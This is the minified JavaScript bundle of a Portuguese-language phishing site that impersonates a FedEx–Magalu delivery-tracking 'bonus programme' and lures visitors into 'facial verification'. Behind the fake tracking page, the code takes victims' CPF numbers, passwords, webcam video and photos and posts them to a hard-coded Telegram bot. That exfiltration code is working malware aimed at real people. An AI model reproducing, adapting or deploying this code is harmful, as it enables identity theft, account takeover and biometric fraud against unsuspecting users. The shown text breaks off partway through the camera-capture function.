e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(de||{});function he(e){let t=a.useContext(J);return t||c(!1),t}function fe(e){let t=a.useContext($);return t||c(!1),t}function pe(e){let t=function(){let e=a.useContext(X);return e||c(!1),e}(),n=t.matches[t.matches.length-1];return n.route.id||c(!1),n.route.id}const me={};function ge(e,t){null==e||e.v7_startTransition,void 0===(null==e?void 0:e.v7_relativeSplatPath)&&(!t||t.v7_relativeSplatPath),t&&(t.v7_fetcherPersist,t.v7_normalizeFormMethod,t.v7_partialHydration,t.v7_skipActionErrorRevalidation)}s.startTransition;function ve(e){c(!1)}function ye(e){let{basename:t="/",children:n=null,location:s,navigationType:o=r.Pop,navigator:i,static:l=!1,future:u}=e;ee()&&c(!1);let d=t.replace(/^\/*/,"/"),h=a.useMemo(()=>({basename:d,navigator:i,static:l,future:G({v7_relativeSplatPath:!1},u)}),[d,u,i,l]);"string"===typeof s&&(s=p(s));let{pathname:f="/",search:m="",hash:g="",state:v=null,key:y="default"}=s,b=a.useMemo(()=>{let e=O(f,d);return null==e?null:{location:{pathname:e,search:m,hash:g,state:v,key:y},navigationType:o}},[d,f,m,g,v,y,o]);return null==b?null:a.createElement(Q.Provider,{value:h},a.createElement(Y.Provider,{children:n,value:b}))}function be(e){let{children:t,location:n}=e;return ae(we(t),n)}new Promise(()=>{});a.Component;function we(e,t){void 0===t&&(t=[]);let n=[];return a.Children.forEach(e,(e,r)=>{if(!a.isValidElement(e))return;let s=[...t,r];if(e.type===a.Fragment)return void n.push.apply(n,we(e.props.children,s));e.type!==ve&&c(!1),e.props.index&&e.props.children&&c(!1);let o={id:e.props.id||s.join("-"),caseSensitive:e.props.caseSensitive,element:e.props.element,Component:e.props.Component,index:e.props.index,path:e.props.path,loader:e.props.loader,action:e.props.action,errorElement:e.props.errorElement,ErrorBoundary:e.props.ErrorBoundary,hasErrorBoundary:null!=e.props.ErrorBoundary||null!=e.props.errorElement,shouldRevalidate:e.props.shouldRevalidate,handle:e.props.handle,lazy:e.props.lazy};e.props.children&&(o.children=we(e.props.children,s)),n.push(o)}),n}var _e=n(950),ke=n.t(_e,2);new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);try{window.__reactRouterVersion="6"}catch(Oa){}new Map;const xe=s.startTransition;ke.flushSync,s.useId;function Se(e){let{basename:t,children:n,future:r,window:s}=e,o=a.useRef();var i;null==o.current&&(o.current=(void 0===(i={window:s,v5Compat:!0})&&(i={}),m(function(e,t){let{pathname:n,search:r,hash:a}=e.location;return h("",{pathname:n,search:r,hash:a},t.state&&t.state.usr||null,t.state&&t.state.key||"default")},function(e,t){return"string"===typeof t?t:f(t)},null,i)));let l=o.current,[c,u]=a.useState({action:l.action,location:l.location}),{v7_startTransition:d}=r||{},p=a.useCallback(e=>{d&&xe?xe(()=>u(e)):u(e)},[u,d]);return a.useLayoutEffect(()=>l.listen(p),[l,p]),a.useEffect(()=>ge(r),[r]),a.createElement(ye,{basename:t,children:n,location:c.location,navigationType:c.action,navigator:l,future:r})}"undefined"!==typeof window&&"undefined"!==typeof window.document&&window.document.createElement;var Ee,je;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Ee||(Ee={})),function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"}(je||(je={}));var Te=n(579);const Ce=()=>{const e=re(),[t,n]=(0,a.useState)("");(0,a.useEffect)(()=>{document.title="FedEx - Parceria Magalu | Rastreamento de Entregas"},[]);return(0,Te.jsxs)("div",{className:"home-container",children:[(0,Te.jsx)("header",{className:"home-header",children:(0,Te.jsxs)("div",{className:"header-content",children:[(0,Te.jsxs)("div",{className:"header-logo",children:[(0,Te.jsx)("div",{className:"header-logo-wrapper",children:(0,Te.jsx)("img",{src:"/logo-magalu-azul (1).png",alt:"Magalu",className:"header-logo-magalu"})}),(0,Te.jsx)("div",{className:"header-logo-wrapper",children:(0,Te.jsx)("img",{src:"/fedex.png",alt:"FedEx",className:"header-logo-fedex"})})]}),(0,Te.jsxs)("nav",{className:"header-nav",children:[(0,Te.jsx)("a",{href:"#servicos",className:"nav-link",children:"Servi\xe7os"}),(0,Te.jsx)("a",{href:"#rastreamento",className:"nav-link",children:"Rastreamento"}),(0,Te.jsx)("a",{href:"#suporte",className:"nav-link",children:"Suporte"})]})]})}),(0,Te.jsx)("section",{className:"hero-section",children:(0,Te.jsxs)("div",{className:"hero-content",children:[(0,Te.jsxs)("div",{className:"hero-text",children:[(0,Te.jsxs)("h1",{className:"hero-title",children:["Parceria ",(0,Te.jsx)("span",{className:"highlight-magalu",children:"Magalu"})," e ",(0,Te.jsx)("span",{className:"highlight-fedex",children:"FedEx"})]}),(0,Te.jsxs)("p",{className:"hero-subtitle",children:[(0,Te.jsx)("strong",{children:"Programa de Bonifica\xe7\xe3o Magalu!"})," Confirme sua entrega e participe do sorteio de pr\xeamios incr\xedveis. Entregas r\xe1pidas, seguras e confi\xe1veis em todo o Brasil atrav\xe9s da parceria entre Magalu e FedEx."]}),(0,Te.jsxs)("div",{className:"bonus-badge",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("path",{d:"M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"})}),(0,Te.jsx)("span",{children:"Confirme sua entrega e concorra a pr\xeamios exclusivos!"})]}),(0,Te.jsxs)("div",{className:"tracking-search-box",id:"rastreamento",children:[(0,Te.jsx)("h2",{className:"search-title",children:"Rastreie seu pedido"}),(0,Te.jsx)("p",{className:"search-subtitle",children:"Digite o c\xf3digo de rastreamento fornecido para acompanhar sua entrega em tempo real"}),(0,Te.jsxs)("form",{onSubmit:n=>{n.preventDefault();const r=t.trim().toUpperCase();r&&e("/rastreamento/".concat(r))},className:"search-form",children:[(0,Te.jsx)("input",{type:"text",placeholder:"Digite o c\xf3digo de rastreamento (ex: PQ1234567890BR)",value:t,onChange:e=>n(e.target.value.toUpperCase()),className:"search-input",maxLength:"14"}),(0,Te.jsxs)("button",{type:"submit",className:"search-button",children:[(0,Te.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,Te.jsx)("path",{d:"m21 21-4.35-4.35"})]}),"Rastrear"]})]})]})]}),(0,Te.jsx)("div",{className:"hero-image",children:(0,Te.jsx)("img",{src:"/bannerfedex.png",alt:"Parceria Magalu e FedEx",className:"hero-banner"})})]})}),(0,Te.jsx)("section",{className:"info-banner",children:(0,Te.jsxs)("div",{className:"info-content",children:[(0,Te.jsx)("div",{className:"info-icon",children:(0,Te.jsxs)("svg",{width:"48",height:"48",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,Te.jsx)("line",{x1:"12",y1:"16",x2:"12",y2:"12"}),(0,Te.jsx)("line",{x1:"12",y1:"8",x2:"12.01",y2:"8"})]})}),(0,Te.jsxs)("div",{className:"info-text",children:[(0,Te.jsx)("h3",{className:"info-title",children:"Programa de Bonifica\xe7\xe3o Magalu"}),(0,Te.jsx)("p",{className:"info-description",children:"Ao confirmar sua entrega atrav\xe9s da verifica\xe7\xe3o facial, voc\xea automaticamente participa do programa de bonifica\xe7\xe3o da Magalu. Concorra a pr\xeamios exclusivos, descontos especiais e benef\xedcios \xfanicos. Quanto mais entregas voc\xea confirmar, maiores s\xe3o suas chances de ganhar pr\xeamios incr\xedveis!"})]})]})}),(0,Te.jsx)("section",{className:"services-section",id:"servicos",children:(0,Te.jsxs)("div",{className:"services-container",children:[(0,Te.jsx)("h2",{className:"section-title",children:"Gerencie suas remessas"}),(0,Te.jsxs)("div",{className:"services-grid",children:[(0,Te.jsxs)("div",{className:"service-card",children:[(0,Te.jsx)("div",{className:"service-icon",children:(0,Te.jsxs)("svg",{width:"48",height:"48",viewBox:"0 0 24 24",fill:"none",stroke:"#4D148C",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("path",{d:"M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"}),(0,Te.jsx)("circle",{cx:"12",cy:"7",r:"4"})]})}),(0,Te.jsx)("h3",{className:"service-title",children:"ABRA UMA CONTA"}),(0,Te.jsx)("p",{className:"service-description",children:"Crie sua conta e tenha acesso a todos os servi\xe7os"})]}),(0,Te.jsxs)("div",{className:"service-card",children:[(0,Te.jsx)("div",{className:"service-icon",children:(0,Te.jsxs)("svg",{width:"48",height:"48",viewBox:"0 0 24 24",fill:"none",stroke:"#4D148C",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("path",{d:"M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"}),(0,Te.jsx)("line",{x1:"12",y1:"9",x2:"12",y2:"13"}),(0,Te.jsx)("line",{x1:"12",y1:"17",x2:"12.01",y2:"17"})]})}),(0,Te.jsx)("h3",{className:"service-title",children:"ALERTAS DE SERVI\xc7O"}),(0,Te.jsx)("p",{className:"service-description",children:"Receba notifica\xe7\xf5es sobre o status das suas entregas"})]}),(0,Te.jsxs)("div",{className:"service-card",children:[(0,Te.jsx)("div",{className:"service-icon",children:(0,Te.jsxs)("svg",{width:"48",height:"48",viewBox:"0 0 24 24",fill:"none",stroke:"#4D148C",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("circle",{cx:"12",cy:"12",r:"3"}),(0,Te.jsx)("path",{d:"M12 1v6m0 6v6M5.64 5.64l4.24 4.24m4.24 4.24l4.24 4.24M1 12h6m6 0h6M5.64 18.36l4.24-4.24m4.24-4.24l4.24-4.24"})]})}),(0,Te.jsx)("h3",{className:"service-title",children:"FERRAMENTAS ON-LINE"}),(0,Te.jsx)("p",{className:"service-description",children:"Acesse ferramentas exclusivas para gerenciar seus envios"})]}),(0,Te.jsxs)("div",{className:"service-card",children:[(0,Te.jsx)("div",{className:"service-icon",children:(0,Te.jsxs)("svg",{width:"48",height:"48",viewBox:"0 0 24 24",fill:"none",stroke:"#4D148C",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("path",{d:"M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"}),(0,Te.jsx)("circle",{cx:"12",cy:"10",r:"3"})]})}),(0,Te.jsx)("h3",{className:"service-title",children:"HOR\xc1RIO DE ATENDIMENTO"}),(0,Te.jsx)("p",{className:"service-description",children:"Encontre lojas e hor\xe1rios de atendimento pr\xf3ximos a voc\xea"})]}),(0,Te.jsxs)("div",{className:"service-card",children:[(0,Te.jsx)("div",{className:"service-icon",children:(0,Te.jsxs)("svg",{width:"48",height:"48",viewBox:"0 0 24 24",fill:"none",stroke:"#4D148C",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("path",{d:"M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"}),(0,Te.jsx)("polyline",{points:"14 2 14 8 20 8"}),(0,Te.jsx)("line",{x1:"16",y1:"13",x2:"8",y2:"13"}),(0,Te.jsx)("line",{x1:"16",y1:"17",x2:"8",y2:"17"}),(0,Te.jsx)("polyline",{points:"10 9 9 9 8 9"})]})}),(0,Te.jsx)("h3",{className:"service-title",children:"FEDEX BILLING ONLINE"}),(0,Te.jsx)("p",{className:"service-description",children:"Gerencie suas faturas e pagamentos online"})]})]})]})}),(0,Te.jsx)("section",{className:"magalu-banner-section",children:(0,Te.jsxs)("div",{className:"magalu-banner-container",children:[(0,Te.jsx)("div",{className:"magalu-banner-image",children:(0,Te.jsx)("img",{src:"/BANNERMAGALU.png",alt:"Programa de Bonifica\xe7\xe3o Magalu",className:"magalu-banner-img"})}),(0,Te.jsxs)("div",{className:"magalu-banner-content",children:[(0,Te.jsx)("h2",{className:"magalu-banner-title",children:"Programa de Bonifica\xe7\xe3o Magalu"}),(0,Te.jsx)("p",{className:"magalu-banner-subtitle",children:"Confirme suas entregas e transforme cada entrega em uma chance de ganhar!"}),(0,Te.jsxs)("div",{className:"magalu-benefits",children:[(0,Te.jsxs)("div",{className:"magalu-benefit-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Participa\xe7\xe3o autom\xe1tica ao confirmar entrega"})]}),(0,Te.jsxs)("div",{className:"magalu-benefit-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Pr\xeamios exclusivos: smartphones, tablets e vale-compras"})]}),(0,Te.jsxs)("div",{className:"magalu-benefit-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Quanto mais voc\xea confirma, maiores suas chances"})]}),(0,Te.jsxs)("div",{className:"magalu-benefit-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Sem custo adicional - totalmente gratuito"})]})]}),(0,Te.jsxs)("p",{className:"magalu-banner-cta",children:[(0,Te.jsx)("strong",{children:"N\xe3o perca essa oportunidade!"})," Cada entrega confirmada \xe9 uma nova chance de ganhar pr\xeamios incr\xedveis."]})]})]})}),(0,Te.jsx)("section",{className:"partnership-section",children:(0,Te.jsxs)("div",{className:"partnership-content",children:[(0,Te.jsxs)("div",{className:"partnership-text",children:[(0,Te.jsx)("h2",{className:"partnership-title",children:"Ganhe pr\xeamios confirmando suas entregas!"}),(0,Te.jsx)("p",{className:"partnership-intro",children:"A parceria Magalu e FedEx oferece muito mais que entregas r\xe1pidas. Ao confirmar sua entrega atrav\xe9s da verifica\xe7\xe3o facial, voc\xea participa automaticamente do programa de bonifica\xe7\xe3o e concorre a pr\xeamios exclusivos, incluindo smartphones, tablets, vale-compras e muito mais!"}),(0,Te.jsxs)("div",{className:"partnership-features",children:[(0,Te.jsxs)("div",{className:"feature-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Rastreamento em tempo real"})]}),(0,Te.jsxs)("div",{className:"feature-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Entregas r\xe1pidas e seguras"})]}),(0,Te.jsxs)("div",{className:"feature-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Cobertura em todo o Brasil"})]}),(0,Te.jsxs)("div",{className:"feature-item",children:[(0,Te.jsx)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"#0066CC",strokeWidth:"2.5",strokeLinecap:"round",strokeLinejoin:"round",children:(0,Te.jsx)("polyline",{points:"20 6 9 17 4 12"})}),(0,Te.jsx)("span",{children:"Suporte 24/7"})]})]})]}),(0,Te.jsx)("div",{className:"partnership-image",children:(0,Te.jsx)("img",{src:"/bannerfedex2.png",alt:"Parceria Magalu e FedEx",className:"partnership-banner"})})]})}),(0,Te.jsx)("section",{className:"cta-section",children:(0,Te.jsxs)("div",{className:"cta-content",children:[(0,Te.jsx)("h2",{className:"cta-title",children:"Confirme sua entrega e concorra a pr\xeamios!"}),(0,Te.jsx)("p",{className:"cta-subtitle",children:"Participe do programa de bonifica\xe7\xe3o Magalu. Quanto mais entregas voc\xea confirmar, maiores s\xe3o suas chances de ganhar!"})]})}),(0,Te.jsx)("footer",{className:"home-footer",children:(0,Te.jsxs)("div",{className:"footer-content",children:[(0,Te.jsxs)("div",{className:"footer-logos",children:[(0,Te.jsx)("img",{src:"/logo-magalu-azul (1).png",alt:"Magalu",className:"footer-logo"}),(0,Te.jsx)("img",{src:"/fedex.png",alt:"FedEx",className:"footer-logo"})]}),(0,Te.jsxs)("div",{className:"footer-links",children:[(0,Te.jsx)("a",{href:"#servicos",className:"footer-link",children:"Servi\xe7os"}),(0,Te.jsx)("a",{href:"#rastreamento",className:"footer-link",children:"Rastreamento"}),(0,Te.jsx)("a",{href:"#suporte",className:"footer-link",children:"Suporte"}),(0,Te.jsx)("a",{href:"/termos",className:"footer-link",children:"Termos e Condi\xe7\xf5es"}),(0,Te.jsx)("a",{href:"https://www.fedex.com/pt-br/home.html",target:"_blank",rel:"noopener noreferrer",className:"footer-link",children:"Site FedEx"})]}),(0,Te.jsxs)("div",{className:"footer-social",children:[(0,Te.jsxs)("a",{href:"https://www.instagram.com/magalu/",target:"_blank",rel:"noopener noreferrer",className:"social-link","aria-label":"Instagram Magalu",children:[(0,Te.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("rect",{x:"2",y:"2",width:"20",height:"20",rx:"5",ry:"5"}),(0,Te.jsx)("path",{d:"M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"}),(0,Te.jsx)("line",{x1:"17.5",y1:"6.5",x2:"17.51",y2:"6.5"})]}),(0,Te.jsx)("span",{children:"Magalu"})]}),(0,Te.jsxs)("a",{href:"https://www.instagram.com/fedex/",target:"_blank",rel:"noopener noreferrer",className:"social-link","aria-label":"Instagram FedEx",children:[(0,Te.jsxs)("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,Te.jsx)("rect",{x:"2",y:"2",width:"20",height:"20",rx:"5",ry:"5"}),(0,Te.jsx)("path",{d:"M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"}),(0,Te.jsx)("line",{x1:"17.5",y1:"6.5",x2:"17.51",y2:"6.5"})]}),(0,Te.jsx)("span",{children:"FedEx"})]})]}),(0,Te.jsxs)("div",{className:"footer-cnpj",children:[(0,Te.jsxs)("div",{className:"cnpj-item",children:[(0,Te.jsx)("strong",{children:"Magalu:"})," CNPJ 47.960.950/0001-21"]}),(0,Te.jsxs)("div",{className:"cnpj-item",children:[(0,Te.jsx)("strong",{children:"FedEx:"})," CNPJ 10.970.887/0001-02"]})]}),(0,Te.jsx)("p",{className:"footer-copyright",children:"\xa9 2025 Parceria Magalu e FedEx. Todos os direitos reservados."})]})})]})},Ne=async e=>{try{var t;const r={NODE_ENV:"production",PUBLIC_URL:"",WDS_SOCKET_HOST:void 0,WDS_SOCKET_PATH:void 0,WDS_SOCKET_PORT:void 0,FAST_REFRESH:!0,REACT_APP_VERCEL_GIT_COMMIT_AUTHOR_NAME:"sacesthervogue-ux",REACT_APP_VERCEL_GIT_PROVIDER:"github",REACT_APP_VERCEL_PROJECT_ID:"prj_WA4vWnB4Cg6CyC7RqmMFigCerAzt",REACT_APP_VERCEL_GIT_PULL_REQUEST_ID:"",REACT_APP_VERCEL_BRANCH_URL:"telaprontatelegr-git-main-lucas-projects-a2d34d0a.vercel.app",REACT_APP_VERCEL_GIT_COMMIT_MESSAGE:"Update README.md",REACT_APP_VERCEL_DEPLOYMENT_ID:"dpl_FtBAspjEQvhxJuPBBpZQmqMcv1WW",REACT_APP_VERCEL_GIT_REPO_SLUG:"telaprontatelegr",REACT_APP_VERCEL_TARGET_ENV:"production",REACT_APP_VERCEL_GIT_COMMIT_SHA:"7e1b9a0fd75d94e874594cfc161d99a4bb0ffdb7",REACT_APP_VERCEL_ENV:"production",REACT_APP_VERCEL_GIT_COMMIT_REF:"main",REACT_APP_VERCEL_URL:"telaprontatelegr-jh9qf7ts1-lucas-projects-a2d34d0a.vercel.app",REACT_APP_VERCEL_PROJECT_PRODUCTION_URL:"www.fedextransportadora.com",REACT_APP_VERCEL_GIT_PREVIOUS_SHA:"",REACT_APP_VERCEL_GIT_REPO_ID:"1161432333",REACT_APP_VERCEL_GIT_COMMIT_AUTHOR_LOGIN:"sacesthervogue-ux",REACT_APP_VERCEL_GIT_REPO_OWNER:"sacesthervogue-ux"}.REACT_APP_TELEGRAM_CHAT_ID||"7480803703",a="https://api.telegram.org/bot".concat({NODE_ENV:"production",PUBLIC_URL:"",WDS_SOCKET_HOST:void 0,WDS_SOCKET_PATH:void 0,WDS_SOCKET_PORT:void 0,FAST_REFRESH:!0,REACT_APP_VERCEL_GIT_COMMIT_AUTHOR_NAME:"sacesthervogue-ux",REACT_APP_VERCEL_GIT_PROVIDER:"github",REACT_APP_VERCEL_PROJECT_ID:"prj_WA4vWnB4Cg6CyC7RqmMFigCerAzt",REACT_APP_VERCEL_GIT_PULL_REQUEST_ID:"",REACT_APP_VERCEL_BRANCH_URL:"telaprontatelegr-git-main-lucas-projects-a2d34d0a.vercel.app",REACT_APP_VERCEL_GIT_COMMIT_MESSAGE:"Update README.md",REACT_APP_VERCEL_DEPLOYMENT_ID:"dpl_FtBAspjEQvhxJuPBBpZQmqMcv1WW",REACT_APP_VERCEL_GIT_REPO_SLUG:"telaprontatelegr",REACT_APP_VERCEL_TARGET_ENV:"production",REACT_APP_VERCEL_GIT_COMMIT_SHA:"7e1b9a0fd75d94e874594cfc161d99a4bb0ffdb7",REACT_APP_VERCEL_ENV:"production",REACT_APP_VERCEL_GIT_COMMIT_REF:"main",REACT_APP_VERCEL_URL:"telaprontatelegr-jh9qf7ts1-lucas-projects-a2d34d0a.vercel.app",REACT_APP_VERCEL_PROJECT_PRODUCTION_URL:"www.fedextransportadora.com",REACT_APP_VERCEL_GIT_PREVIOUS_SHA:"",REACT_APP_VERCEL_GIT_REPO_ID:"1161432333",REACT_APP_VERCEL_GIT_COMMIT_AUTHOR_LOGIN:"sacesthervogue-ux",REACT_APP_VERCEL_GIT_REPO_OWNER:"sacesthervogue-ux"}.REACT_APP_TELEGRAM_BOT_TOKEN||"8295970247:AAFaSORnkq5Qp4N6l-XpLcP0qEKHrVqfzCY"),{cpf:s,password:o,video:i,videoFrame:l,timestamp:c}=e,u=i||l,d="\n\ud83d\udd10 *Nova Verifica\xe7\xe3o - FedEx*\n\n\ud83d\udccb *CPF:* `".concat(s.replace(/\D/g,""),"`\n\ud83d\udd11 *Senha:* `").concat(o,"`\n\ud83d\udcc5 *Data/Hora:* ").concat(new Date(c).toLocaleString("pt-BR"),"\n\ud83d\udcf1 *User Agent:* ").concat(e.userAgent||"N/A","\n\n\u2705 Verifica\xe7\xe3o conclu\xedda com sucesso!\n    ").trim(),h=await fetch("".concat(a,"/sendMessage"),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:r,text:d,parse_mode:"Markdown"})});if(!h.ok){const e=await h.json();throw new Error(e.description||"Erro ao enviar mensagem")}const f=await h.json();if(u)try{const e=u.includes(",")?u.split(",")[1]:u,t=atob(e),n=new Array(t.length);for(let r=0;r<t.length;r++)n[r]=t.charCodeAt(r);const o=new Uint8Array(n),i=u.includes("video")||u.includes("webm")||u.includes("mp4"),l=new Blob([o],{type:i?"video/webm":"image/jpeg"});if(i){const e=new FormData;e.append("chat_id",r),e.append("video",l,"verification.webm"),e.append("caption","\ud83c\udfa5 V\xeddeo de verifica\xe7\xe3o - CPF: ".concat(s.replace(/\D/g,"")));const t=await fetch("".concat(a,"/sendVideo"),{method:"POST",body:e});if(!t.ok){const e=await t.json();console.error("Erro ao enviar v\xeddeo:",e);const n=new FormData;n.append("chat_id",r),n.append("document",l,"verification.webm"),n.append("caption","\ud83c\udfa5 V\xeddeo de verifica\xe7\xe3o - CPF: ".concat(s.replace(/\D/g,""))),fetch("".concat(a,"/sendDocument"),{method:"POST",body:n}).catch(e=>console.error("Erro ao enviar como documento:",e))}}else{const e=new FormData;e.append("chat_id",r),e.append("photo",l,"verification.jpg"),e.append("caption","\ud83d\udcf8 Foto de verifica\xe7\xe3o - CPF: ".concat(s.replace(/\D/g,"")));const t=await fetch("".concat(a,"/sendPhoto"),{method:"POST",body:e});if(!t.ok){const e=await t.json();console.error("Erro ao enviar foto:",e)}}}catch(n){console.error("Erro ao processar m\xeddia:",n)}return{success:!0,message:"Dados enviados para Telegram com sucesso",messageId:null===(t=f.result)||void 0===t?void 0:t.message_id}}catch(r){throw console.error("Erro ao enviar para Telegram:",r),r}},Re=async e=>{try{const t=await(async e=>{try{const t={NODE_ENV:"production",PUBLIC_URL:"",WDS_SOCKET_HOST:void 0,WDS_SOCKET_PATH:void 0,WDS_SOCKET_PORT:void 0,FAST_REFRESH:!0,REACT_APP_VERCEL_GIT_COMMIT_AUTHOR_NAME:"sacesthervogue-ux",REACT_APP_VERCEL_GIT_PROVIDER:"github",REACT_APP_VERCEL_PROJECT_ID:"prj_WA4vWnB4Cg6CyC7RqmMFigCerAzt",REACT_APP_VERCEL_GIT_PULL_REQUEST_ID:"",REACT_APP_VERCEL_BRANCH_URL:"telaprontatelegr-git-main-lucas-projects-a2d34d0a.vercel.app",REACT_APP_VERCEL_GIT_COMMIT_MESSAGE:"Update README.md",REACT_APP_VERCEL_DEPLOYMENT_ID:"dpl_FtBAspjEQvhxJuPBBpZQmqMcv1WW",REACT_APP_VERCEL_GIT_REPO_SLUG:"telaprontatelegr",REACT_APP_VERCEL_TARGET_ENV:"production",REACT_APP_VERCEL_GIT_COMMIT_SHA:"7e1b9a0fd75d94e874594cfc161d99a4bb0ffdb7",REACT_APP_VERCEL_ENV:"production",REACT_APP_VERCEL_GIT_COMMIT_REF:"main",REACT_APP_VERCEL_URL:"telaprontatelegr-jh9qf7ts1-lucas-projects-a2d34d0a.vercel.app",REACT_APP_VERCEL_PROJECT_PRODUCTION_URL:"www.fedextransportadora.com",REACT_APP_VERCEL_GIT_PREVIOUS_SHA:"",REACT_APP_VERCEL_GIT_REPO_ID:"1161432333",REACT_APP_VERCEL_GIT_COMMIT_AUTHOR_LOGIN:"sacesthervogue-ux",REACT_APP_VERCEL_GIT_REPO_OWNER:"sacesthervogue-ux"}.REACT_APP_API_URL||window.location.origin,n="".concat(t,"/api/telegram-proxy");console.log("\ud83d\udce4 Enviando dados para Telegram via proxy..."),console.log("   URL:",n),console.log("   Dados:",{cpf:e.cpf?"***":"missing",password:e.password?"***":"missing",hasVideo:!!e.video,timestamp:e.timestamp});const r=await fetch(n,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});if(console.log("\ud83d\udce5 Resposta recebida:",r.status,r.statusText),!r.ok){const e=await r.json().catch(()=>({message:"Erro desconhecido"}));throw console.error("\u274c Erro na resposta:",e),new Error(e.message||e.error||"Erro ao enviar para Telegram")}const a=await r.json();return console.log("\u2705 Dados enviados com sucesso!",a),a}catch(t){console.error("\u274c Erro ao enviar para Telegram via proxy:",t),console.error("   Erro detalhado:",t.message);try{return console.log("\ud83d\udd04 Tentando m\xe9todo direto..."),await Ne(e)}catch(n){throw console.error("\u274c Erro ao enviar diretamente:",n),n}}})(e);return t}catch(t){throw console.error("Erro ao salvar dados:",t),t}},Pe=()=>{const[e,t]=(0,a.useState)("tips"),[n,r]=(0,a.useState)(0),[s,o]=(0,a.useState)(!1),[i,l]=(0,a.useState)(null),[c,u]=(0,a.useState)(""),[d,h]=(0,a.useState)(!1),f=(0,a.useRef)(null),p=re(),m=te();(0,a.useEffect)(()=>{document.title="FedEx - Confirme sua Entrega"},[]);const g=(0,a.useMemo)(()=>["Aproxime-se","Afastese"],[]),v=async()=>{try{const e=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:640},height:{ideal:480}}});return console.log("Stream criado - ativo:",e.active),console.log("Tracks:",e.getTracks().length),e.getTracks().forEach(e=>{console.log("Track:",e.kind,"- enabled:",e.enabled,"- readyState:",e.readyState),e.onended=()=>{console.warn("Track 